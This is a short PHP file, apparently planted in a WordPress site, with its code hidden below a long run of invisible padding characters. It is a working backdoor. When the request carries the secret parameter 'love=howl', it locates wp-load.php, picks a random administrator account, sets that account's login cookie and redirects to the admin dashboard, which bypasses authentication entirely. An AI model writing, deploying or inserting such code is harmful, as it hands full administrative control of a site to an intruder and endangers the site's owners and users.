‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎

<?php

$secret = 'howl';

if (!isset($_GET['love']) || $_GET['love'] !== $secret) {
    http_response_code(403);
    die('Access Denied');
}

$current_dir = __DIR__;
$wp_load_path = null;

while (true) {
    if (file_exists($current_dir . '/wp-load.php')) {
        $wp_load_path = $current_dir . '/wp-load.php';
        break;
    }
    if ($current_dir === dirname($current_dir)) {
        break;
    }
    $current_dir = dirname($current_dir);
}

if ($wp_load_path === null) {
    die('Error: Could not find wp-load.php.');
}

require_once($wp_load_path);

$admins = get_users(['role' => 'administrator']);

if (!empty($admins)) {
    $random_admin = $admins[array_rand($admins)];
    $user_id = $random_admin->ID;

    wp_set_auth_cookie($user_id);
    wp_set_current_user($user_id);

    wp_redirect(admin_url());
    exit;
} else {
    echo "No administrators found.";
}

?>
